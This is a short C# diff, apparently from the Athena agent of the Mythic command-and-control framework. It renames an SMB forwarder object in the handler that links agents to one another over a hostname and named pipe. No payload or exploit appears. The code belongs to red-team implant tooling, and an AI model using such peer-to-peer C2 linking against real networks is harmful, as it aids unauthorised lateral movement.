@@ -173,13 +173,13 @@ namespace Athena.Commands
                         Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                         if (par.ContainsKey("hostname") && par.ContainsKey("pipename"))
                         {
-                            if (Globals.mc.MythicConfig.smbForwarder.Link(par["hostname"], par["pipename"]).Result)
+                            if (Globals.mc.MythicConfig.forwarder.Link(par["hostname"], par["pipename"]).Result)
                             {
                                 completeJob(ref job, "Link established.", false);
                             }
                             else
                             {
-                                if (Globals.mc.MythicConfig.smbForwarder.connected)
+                                if (Globals.mc.MythicConfig.forwarder.connected)
                                 {
                                     completeJob(ref job, "A connection has already been established with an Athena agent.", true);
                                 }
